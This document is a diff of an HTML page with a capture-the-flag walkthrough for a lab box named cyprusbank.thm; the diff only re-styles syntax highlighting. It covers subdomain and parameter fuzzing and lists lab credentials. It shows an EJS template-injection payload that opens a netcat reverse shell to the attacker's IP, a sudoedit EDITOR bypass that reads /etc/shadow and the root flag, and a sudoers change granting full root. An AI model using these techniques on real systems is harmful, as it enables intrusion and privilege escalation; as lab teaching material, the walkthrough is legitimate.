@@ -125,39 +125,39 @@
 <blockquote>
 <p>first nmap</p>
 </blockquote>
-<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
-|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
-|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
-80/tcp open  http    nginx 1.14.0 (Ubuntu)
-|_http-title: 416 Requested Range Not Satisfiable
-|_http-csrf: Couldn't find any CSRF vulnerabilities.
-|_http-dombased-xss: Couldn't find any DOM based XSS.                                                  
-|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                       
-Device type: general purpose
-Running: Linux 4.X
-OS CPE: cpe:/o:linux:linux_kernel:4.15
-OS details: Linux 4.15
-Network Distance: 4 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">7.6</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="nx">ubuntu0</span><span class="m m-Double">.7</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">2048</span><span class="w"> </span><span class="nx">b9</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">96</span><span class="p">:</span><span class="mi">0</span><span class="nx">d</span><span class="p">:</span><span class="nx">c4</span><span class="p">:</span><span class="nx">b6</span><span class="p">:</span><span class="mi">0</span><span class="nx">c</span><span class="p">:</span><span class="nx">d6</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">1</span><span class="nx">a</span><span class="p">:</span><span class="nx">e4</span><span class="p">:</span><span class="mi">6</span><span class="nx">c</span><span class="p">:</span><span class="mi">8</span><span class="nx">e</span><span class="p">:</span><span class="nx">ac</span><span class="p">:</span><span class="mi">6</span><span class="nx">f</span><span class="p">:</span><span class="mi">7</span><span class="nx">d</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="nx">ba</span><span class="p">:</span><span class="nx">ff</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">3</span><span class="nx">e</span><span class="p">:</span><span class="mi">0</span><span class="nx">f</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">7</span><span class="nx">e</span><span class="p">:</span><span class="nx">da</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="nx">ca</span><span class="p">:</span><span class="nx">e3</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">8</span><span class="nx">d</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="nx">d9</span><span class="p">:</span><span class="mi">6</span><span class="nx">c</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">5</span><span class="nx">d</span><span class="p">:</span><span class="nx">e4</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="nx">ca</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="nx">de</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">7</span><span class="nx">d</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.14.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="mi">416</span><span class="w"> </span><span class="nx">Requested</span><span class="w"> </span><span class="nx">Range</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Satisfiable</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">csrf</span><span class="p">:</span><span class="w"> </span><span class="nx">Couldn</span><span class="err">&#39;</span><span class="nx">t</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">CSRF</span><span class="w"> </span><span class="nx">vulnerabilities</span><span class="p">.</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">dombased</span><span class="o">-</span><span class="nx">xss</span><span class="p">:</span><span class="w"> </span><span class="nx">Couldn</span><span class="err">&#39;</span><span class="nx">t</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">DOM</span><span class="w"> </span><span class="nx">based</span><span class="w"> </span><span class="nx">XSS</span><span class="p">.</span><span class="w">                                                  </span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">stored</span><span class="o">-</span><span class="nx">xss</span><span class="p">:</span><span class="w"> </span><span class="nx">Couldn</span><span class="err">&#39;</span><span class="nx">t</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">stored</span><span class="w"> </span><span class="nx">XSS</span><span class="w"> </span><span class="nx">vulnerabilities</span><span class="p">.</span><span class="w">                                       </span>
+<span class="nx">Device</span><span class="w"> </span><span class="k">type</span><span class="p">:</span><span class="w"> </span><span class="nx">general</span><span class="w"> </span><span class="nx">purpose</span>
+<span class="nx">Running</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="mi">4</span><span class="p">.</span><span class="nx">X</span>
+<span class="nx">OS</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="m m-Double">4.15</span>
+<span class="nx">OS</span><span class="w"> </span><span class="nx">details</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">4.15</span>
+<span class="nx">Network</span><span class="w"> </span><span class="nx">Distance</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="nx">hops</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw 1
+<div class="codehilite"><pre><span></span><code>❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw 1
 ________________________________________________
 
 www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 390ms]
 admin          
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>Olivia Cortez - olivi8
-Gayle Bev - p~]P@5!6;rs558:q
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">Olivia</span><span class="w"> </span><span class="n">Cortez</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">olivi8</span>
+<span class="n">Gayle</span><span class="w"> </span><span class="n">Bev</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">p</span><span class="o">~</span><span class="p">]</span><span class="n">P</span><span class="mi">@5</span><span class="o">!</span><span class="mi">6</span><span class="p">;</span><span class="n">rs558</span><span class="o">:</span><span class="n">q</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>❯ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg' -mc all -d 'name=test&amp;password=test&amp;FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
+<div class="codehilite"><pre><span></span><code>❯ ffuf -u &#39;http://admin.cyprusbank.thm/settings&#39; -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -H &#39;Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg&#39; -mc all -d &#39;name=test&amp;password=test&amp;FUZZ=test&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
 
-        /'___\  /'___\           /'___\       
+        /&#39;___\  /&#39;___\           /&#39;___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
@@ -186,130 +186,130 @@ include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration
 error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 1751ms]
 message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 1022ms]
 client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 1554ms]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>POST /settings HTTP/1.1
-Host: admin.cyprusbank.thm
-Content-Length: 156
-Cache-Control: max-age=0
-Accept-Language: en-US,en;q=0.9
-Origin: http://admin.cyprusbank.thm
-Content-Type: application/x-www-form-urlencoded
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://admin.cyprusbank.thm/settings
-Accept-Encoding: gzip, deflate, br
-Cookie: connect.sid=s%3AukFjA-XkmVVp9DfUoHMzrngAOtRqIbCd.mFUIQlrJiCkpaEavbF%2FPHGqRtr1ccSVHXdWkpB41bWc
-Connection: keep-alive
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/settings</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">admin.cyprusbank.thm</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">156</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://admin.cyprusbank.thm</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://admin.cyprusbank.thm/settings</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">connect.sid=s%3AukFjA-XkmVVp9DfUoHMzrngAOtRqIbCd.mFUIQlrJiCkpaEavbF%2FPHGqRtr1ccSVHXdWkpB41bWc</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
 
-name=x&amp;password=x&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.21.16.42 1337 -e bash');s
-</code></pre>
+<span class="nt">name</span><span class="o">=</span><span class="s">x</span><span class="p">&amp;</span><span class="nt">password</span><span class="o">=</span><span class="s">x</span><span class="p">&amp;</span><span class="nt">settings[view options][outputFunctionName]</span><span class="o">=</span><span class="s">x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;busybox nc 10.21.16.42 1337 -e bash&#39;);s</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
-└─$ nc -lnvp 1337
-listening on [any] 1337 ...
-connect to [10.21.16.42] from (UNKNOWN) [10.201.43.252] 59294
+<div class="codehilite"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└─$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">1337</span>
+<span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="nb">any</span><span class="p">]</span><span class="w"> </span><span class="mi">1337</span><span class="w"> </span><span class="o">...</span>
+<span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.21.16.42</span><span class="p">]</span><span class="w"> </span><span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.201.43.252</span><span class="p">]</span><span class="w"> </span><span class="mi">59294</span>
 
-which python
+<span class="n">which</span><span class="w"> </span><span class="n">python</span>
 
-which python3
-/usr/bin/python3
-python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-web@cyprusbank:~/app$ export TERM=xterm
-export TERM=xterm
-web@cyprusbank:~/app$ ^Z
-[1]+  Stopped                 nc -lnvp 1337
+<span class="n">which</span><span class="w"> </span><span class="n">python3</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span>
+<span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="n">web</span><span class="nd">@cyprusbank</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span><span class="w"> </span><span class="n">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="n">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="n">web</span><span class="nd">@cyprusbank</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span><span class="w"> </span><span class="o">^</span><span class="n">Z</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="w">  </span><span class="n">Stopped</span><span class="w">                 </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">1337</span>
 
-┌──(kali㉿kali)-[~]
-└─$ stty raw -echo; fg
-stty rows 38 columns 116
-nc -lnvp 1337
+<span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└─$</span><span class="w"> </span><span class="n">stty</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="w"> </span><span class="n">fg</span>
+<span class="n">stty</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="mi">38</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="mi">116</span>
+<span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">1337</span>
 
-web@cyprusbank:~/app$
-</code></pre>
+<span class="n">web</span><span class="nd">@cyprusbank</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>web@cyprusbank:~/app$ ls
-components  node_modules  package-lock.json  static
-index.js    package.json  routes             views
-web@cyprusbank:~/app$ cd /home                                                                                                                            
-web@cyprusbank:/home$ ls                                                                                                                                  
-web                                                                                                                                                        
-web@cyprusbank:/home$ cd web                                                                                                                               
-web@cyprusbank:~$ ls                                                                                                                                       
-app  user.txt                                                                                                                                              
-web@cyprusbank:~$ cat user.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">~/</span><span class="nx">app</span><span class="err">$</span><span class="w"> </span><span class="nx">ls</span>
+<span class="nx">components</span><span class="w">  </span><span class="nx">node_modules</span><span class="w">  </span><span class="kn">package</span><span class="o">-</span><span class="nx">lock</span><span class="p">.</span><span class="nx">json</span><span class="w">  </span><span class="nx">static</span>
+<span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="w">    </span><span class="kn">package</span><span class="p">.</span><span class="nx">json</span><span class="w">  </span><span class="nx">routes</span><span class="w">             </span><span class="nx">views</span>
+<span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">~/</span><span class="nx">app</span><span class="err">$</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="w">                                                                                                                            </span>
+<span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="err">$</span><span class="w"> </span><span class="nx">ls</span><span class="w">                                                                                                                                  </span>
+<span class="nx">web</span><span class="w">                                                                                                                                                        </span>
+<span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="err">$</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">web</span><span class="w">                                                                                                                               </span>
+<span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="nx">ls</span><span class="w">                                                                                                                                       </span>
+<span class="nx">app</span><span class="w">  </span><span class="nx">user</span><span class="p">.</span><span class="nx">txt</span><span class="w">                                                                                                                                              </span>
+<span class="nx">web</span><span class="err">@</span><span class="nx">cyprusbank</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>web@cyprusbank:~$ sudo -l                                                                                                                                  
-Matching Defaults entries for web on cyprusbank:                                                                                                           
-    env_keep+=&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;, env_keep+=&quot;XAPPLRESDIR                                                                            
-    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;,                                                                                                                  
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
-    mail_badpass
+<div class="codehilite"><pre><span></span><code><span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">                                                                                                                                  </span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">cyprusbank</span><span class="p">:</span><span class="w">                                                                                                           </span>
+<span class="w">    </span><span class="n">env_keep</span><span class="o">+=</span><span class="s2">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">env_keep</span><span class="o">+=</span><span class="s2">&quot;XAPPLRESDIR                                                                            </span>
+<span class="w">    </span><span class="n">XFILESEARCHPATH</span><span class="w"> </span><span class="n">XUSERFILESEARCHPATH</span><span class="s2">&quot;,                                                                                                                  </span>
+<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span>
+<span class="w">    </span><span class="n">mail_badpass</span>
 
-User web may run the following commands on cyprusbank:
-    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-web@cyprusbank:~$ export EDITOR=&quot;vi -- /etc/shadow&quot;
-web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-sudo: sudoedit doesn't need to be run via sudo
-sudo: --: editing files in a writable directory is not permitted
-[1]+  Stopped                 
-sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-</code></pre>
+<span class="n">User</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">cyprusbank</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">EDITOR</span><span class="o">=</span><span class="s2">&quot;vi -- /etc/shadow&quot;</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t need to be run via sudo</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="o">--</span><span class="p">:</span><span class="w"> </span><span class="n">editing</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">permitted</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="w">  </span><span class="n">Stopped</span><span class="w">                 </span>
+<span class="n">sudo</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+</code></pre></div>
 
 <blockquote>
 <p>above we can see root hash</p>
 </blockquote>
-<pre class="codehilite"><code>web@cyprusbank:~$ export EDITOR=&quot;vi -- /root/root.txt&quot;
-web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-sudo: sudoedit doesn't need to be run via sudo
-sudo: --: editing files in a writable directory is not permitted
-2 files to edit
-web@cyprusbank:~$             sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">EDITOR</span><span class="o">=</span><span class="s2">&quot;vi -- /root/root.txt&quot;</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t need to be run via sudo</span>
+<span class="n">sudo</span><span class="p">:</span><span class="w"> </span><span class="o">--</span><span class="p">:</span><span class="w"> </span><span class="n">editing</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">permitted</span>
+<span class="mi">2</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">edit</span>
+<span class="n">web</span><span class="err">@</span><span class="n">cyprusbank</span><span class="p">:</span><span class="o">~$</span><span class="w">             </span><span class="n">sudo</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">cyprusbank</span><span class="o">.</span><span class="n">thm</span>
+</code></pre></div>
 
 <blockquote>
 <p>above we can see root.txt but we exploit that cve <code>sudoeditbypass</code></p>
 </blockquote>
-<pre class="codehilite"><code>##
-## User privilege specification
-##
-root ALL=(ALL:ALL) ALL
+<div class="codehilite"><pre><span></span><code><span class="cp">##</span>
+<span class="cp">## User privilege specification</span>
+<span class="cp">##</span>
+<span class="n">root</span><span class="w"> </span><span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">ALL</span><span class="o">:</span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">ALL</span>
 
-## Uncomment to allow members of group wheel to execute any command
+<span class="cp">## Uncomment to allow members of group wheel to execute any command</span>
 
 
-## Same thing without a password
-# %wheel ALL=(ALL:ALL) NOPASSWD: ALL
+<span class="cp">## Same thing without a password</span>
+<span class="cp"># %wheel ALL=(ALL:ALL) NOPASSWD: ALL</span>
 
-## Uncomment to allow members of group sudo to execute any command
-%sudo   ALL=(ALL:ALL) ALL
-web     ALL=(root) NOPASSWD: ALL
-## Uncomment to allow any user to run sudo if they know the password
-## of the user they are running the command as (root by default).
-# Defaults targetpw  # Ask for the password of the target user
-# ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with 'Defaults targett
-pw'
+<span class="cp">## Uncomment to allow members of group sudo to execute any command</span>
